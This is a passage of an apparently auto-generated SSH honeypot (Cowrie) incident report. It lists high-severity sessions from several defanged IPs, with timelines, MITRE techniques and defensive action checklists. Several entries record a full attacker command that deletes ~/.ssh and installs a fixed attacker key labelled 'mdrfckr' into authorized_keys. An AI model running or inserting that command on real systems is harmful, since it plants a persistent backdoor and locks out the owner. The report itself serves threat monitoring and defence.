| `2026-04-14 17:46:15` | `cowrie.command.failed` |
| `2026-04-14 17:46:15` | `cowrie.log.closed` |
| `2026-04-14 17:46:15` | `cowrie.session.params` |
| `2026-04-14 17:46:15` | `cowrie.command.input` |
| `2026-04-14 17:46:15` | `cowrie.session.file_download` |
| `2026-04-14 17:46:15` | `cowrie.log.closed` |
| `2026-04-14 17:46:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05dfa7305a0

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:46 |
| **Last Seen** | 2026-04-14 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:46:17` | `cowrie.session.connect` |
| `2026-04-14 17:46:17` | `cowrie.client.version` |
| `2026-04-14 17:46:17` | `cowrie.client.kex` |
| `2026-04-14 17:46:17` | `cowrie.login.success` |
| `2026-04-14 17:46:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e008221980f2

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:46 |
| **Last Seen** | 2026-04-14 17:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:46:26` | `cowrie.session.connect` |
| `2026-04-14 17:46:26` | `cowrie.client.version` |
| `2026-04-14 17:46:27` | `cowrie.client.kex` |
| `2026-04-14 17:46:28` | `cowrie.login.success` |
| `2026-04-14 17:46:28` | `cowrie.session.params` |
| `2026-04-14 17:46:28` | `cowrie.command.input` |
| `2026-04-14 17:46:28` | `cowrie.command.failed` |
| `2026-04-14 17:46:28` | `cowrie.log.closed` |
| `2026-04-14 17:46:29` | `cowrie.session.params` |
| `2026-04-14 17:46:29` | `cowrie.command.input` |
| `2026-04-14 17:46:29` | `cowrie.session.file_download` |
| `2026-04-14 17:46:29` | `cowrie.log.closed` |
| `2026-04-14 17:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b18ba98ffecb

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:46 |
| **Last Seen** | 2026-04-14 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:46:32` | `cowrie.session.connect` |
| `2026-04-14 17:46:32` | `cowrie.client.version` |
| `2026-04-14 17:46:32` | `cowrie.client.kex` |
| `2026-04-14 17:46:33` | `cowrie.login.success` |
| `2026-04-14 17:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d7dfa0ec786

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:46 |
| **Last Seen** | 2026-04-14 17:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:46:46` | `cowrie.session.connect` |
| `2026-04-14 17:46:46` | `cowrie.client.version` |
| `2026-04-14 17:46:46` | `cowrie.client.kex` |
| `2026-04-14 17:46:46` | `cowrie.login.success` |
| `2026-04-14 17:46:46` | `cowrie.session.params` |
| `2026-04-14 17:46:46` | `cowrie.command.input` |
| `2026-04-14 17:46:46` | `cowrie.command.failed` |
| `2026-04-14 17:46:46` | `cowrie.log.closed` |
| `2026-04-14 17:46:46` | `cowrie.session.params` |
| `2026-04-14 17:46:46` | `cowrie.command.input` |
| `2026-04-14 17:46:46` | `cowrie.session.file_download` |
| `2026-04-14 17:46:46` | `cowrie.log.closed` |
| `2026-04-14 17:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ccebcc5947

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:46 |
| **Last Seen** | 2026-04-14 17:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:46:48` | `cowrie.session.connect` |
| `2026-04-14 17:46:48` | `cowrie.client.version` |
| `2026-04-14 17:46:48` | `cowrie.client.kex` |
| `2026-04-14 17:46:48` | `cowrie.login.success` |
| `2026-04-14 17:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83162ec8a81

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:47 |
| **Last Seen** | 2026-04-14 17:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:47:28` | `cowrie.session.connect` |
| `2026-04-14 17:47:28` | `cowrie.client.version` |
| `2026-04-14 17:47:28` | `cowrie.client.kex` |
| `2026-04-14 17:47:29` | `cowrie.login.success` |
| `2026-04-14 17:47:30` | `cowrie.session.params` |
| `2026-04-14 17:47:30` | `cowrie.command.input` |
| `2026-04-14 17:47:30` | `cowrie.command.failed` |
| `2026-04-14 17:47:30` | `cowrie.log.closed` |
| `2026-04-14 17:47:31` | `cowrie.session.params` |
| `2026-04-14 17:47:31` | `cowrie.command.input` |
| `2026-04-14 17:47:31` | `cowrie.session.file_download` |
| `2026-04-14 17:47:31` | `cowrie.log.closed` |
| `2026-04-14 17:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f88bbc4465b6

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:47 |
| **Last Seen** | 2026-04-14 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:47:35` | `cowrie.session.connect` |
| `2026-04-14 17:47:35` | `cowrie.client.version` |
| `2026-04-14 17:47:35` | `cowrie.client.kex` |
| `2026-04-14 17:47:37` | `cowrie.login.success` |
| `2026-04-14 17:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd4b8861c372

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:48 |
| **Last Seen** | 2026-04-14 17:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:48:19` | `cowrie.session.connect` |
| `2026-04-14 17:48:19` | `cowrie.client.version` |
| `2026-04-14 17:48:19` | `cowrie.client.kex` |
| `2026-04-14 17:48:19` | `cowrie.login.success` |
| `2026-04-14 17:48:19` | `cowrie.session.params` |
| `2026-04-14 17:48:19` | `cowrie.command.input` |
| `2026-04-14 17:48:19` | `cowrie.command.failed` |
| `2026-04-14 17:48:20` | `cowrie.log.closed` |
| `2026-04-14 17:48:20` | `cowrie.session.params` |
| `2026-04-14 17:48:20` | `cowrie.command.input` |
| `2026-04-14 17:48:20` | `cowrie.session.file_download` |
| `2026-04-14 17:48:20` | `cowrie.log.closed` |
| `2026-04-14 17:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d0cb6d2f56

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:48 |
| **Last Seen** | 2026-04-14 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:48:22` | `cowrie.session.connect` |
| `2026-04-14 17:48:22` | `cowrie.client.version` |
| `2026-04-14 17:48:22` | `cowrie.client.kex` |
| `2026-04-14 17:48:22` | `cowrie.login.success` |
| `2026-04-14 17:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0fec4d6cbea

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:48 |
| **Last Seen** | 2026-04-14 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:48:31` | `cowrie.session.connect` |
| `2026-04-14 17:48:31` | `cowrie.client.version` |
| `2026-04-14 17:48:31` | `cowrie.client.kex` |
| `2026-04-14 17:48:32` | `cowrie.login.success` |
| `2026-04-14 17:48:32` | `cowrie.session.params` |
| `2026-04-14 17:48:32` | `cowrie.command.input` |
| `2026-04-14 17:48:32` | `cowrie.command.failed` |
| `2026-04-14 17:48:32` | `cowrie.log.closed` |
| `2026-04-14 17:48:32` | `cowrie.session.params` |
| `2026-04-14 17:48:32` | `cowrie.command.input` |
| `2026-04-14 17:48:32` | `cowrie.session.file_download` |
| `2026-04-14 17:48:32` | `cowrie.log.closed` |
| `2026-04-14 17:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49acc03d6903

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:48 |
| **Last Seen** | 2026-04-14 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:48:34` | `cowrie.session.connect` |
| `2026-04-14 17:48:34` | `cowrie.client.version` |
| `2026-04-14 17:48:34` | `cowrie.client.kex` |
| `2026-04-14 17:48:34` | `cowrie.login.success` |
| `2026-04-14 17:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d89304d8bd2e

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:48 |
| **Last Seen** | 2026-04-14 17:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:48:55` | `cowrie.session.connect` |
| `2026-04-14 17:48:55` | `cowrie.client.version` |
| `2026-04-14 17:48:56` | `cowrie.client.kex` |
| `2026-04-14 17:48:57` | `cowrie.login.success` |
| `2026-04-14 17:48:57` | `cowrie.session.params` |
| `2026-04-14 17:48:57` | `cowrie.command.input` |
| `2026-04-14 17:48:57` | `cowrie.command.failed` |
| `2026-04-14 17:48:57` | `cowrie.log.closed` |
| `2026-04-14 17:48:58` | `cowrie.session.params` |
| `2026-04-14 17:48:58` | `cowrie.command.input` |
| `2026-04-14 17:48:58` | `cowrie.session.file_download` |
| `2026-04-14 17:48:58` | `cowrie.log.closed` |
| `2026-04-14 17:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd927e7bb13f

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:49 |
| **Last Seen** | 2026-04-14 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:49:01` | `cowrie.session.connect` |
| `2026-04-14 17:49:01` | `cowrie.client.version` |
| `2026-04-14 17:49:01` | `cowrie.client.kex` |
| `2026-04-14 17:49:02` | `cowrie.login.success` |
| `2026-04-14 17:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3662f15986b3

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:49 |
| **Last Seen** | 2026-04-14 17:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:49:10` | `cowrie.session.connect` |
| `2026-04-14 17:49:10` | `cowrie.client.version` |
| `2026-04-14 17:49:10` | `cowrie.client.kex` |
| `2026-04-14 17:49:11` | `cowrie.login.success` |
| `2026-04-14 17:49:12` | `cowrie.session.params` |
| `2026-04-14 17:49:12` | `cowrie.command.input` |
| `2026-04-14 17:49:12` | `cowrie.command.failed` |
| `2026-04-14 17:49:12` | `cowrie.log.closed` |
| `2026-04-14 17:49:13` | `cowrie.session.params` |
| `2026-04-14 17:49:13` | `cowrie.command.input` |
| `2026-04-14 17:49:13` | `cowrie.session.file_download` |
| `2026-04-14 17:49:13` | `cowrie.log.closed` |
| `2026-04-14 17:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ac3d07e44f

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:49 |
| **Last Seen** | 2026-04-14 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:49:17` | `cowrie.session.connect` |
| `2026-04-14 17:49:17` | `cowrie.client.version` |
| `2026-04-14 17:49:17` | `cowrie.client.kex` |
| `2026-04-14 17:49:18` | `cowrie.login.success` |
| `2026-04-14 17:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a299e9e3e1

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:49 |
| **Last Seen** | 2026-04-14 17:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:49:50` | `cowrie.session.connect` |
| `2026-04-14 17:49:50` | `cowrie.client.version` |
| `2026-04-14 17:49:50` | `cowrie.client.kex` |
| `2026-04-14 17:49:51` | `cowrie.login.success` |
| `2026-04-14 17:49:51` | `cowrie.session.params` |
| `2026-04-14 17:49:51` | `cowrie.command.input` |
| `2026-04-14 17:49:51` | `cowrie.command.failed` |
| `2026-04-14 17:49:51` | `cowrie.log.closed` |
| `2026-04-14 17:49:51` | `cowrie.session.params` |
| `2026-04-14 17:49:51` | `cowrie.command.input` |
| `2026-04-14 17:49:52` | `cowrie.session.file_download` |
| `2026-04-14 17:49:52` | `cowrie.log.closed` |
| `2026-04-14 17:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4d3003e4e32

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:49 |
| **Last Seen** | 2026-04-14 17:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:49:53` | `cowrie.session.connect` |
| `2026-04-14 17:49:53` | `cowrie.client.version` |
| `2026-04-14 17:49:53` | `cowrie.client.kex` |
| `2026-04-14 17:49:54` | `cowrie.login.success` |
| `2026-04-14 17:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

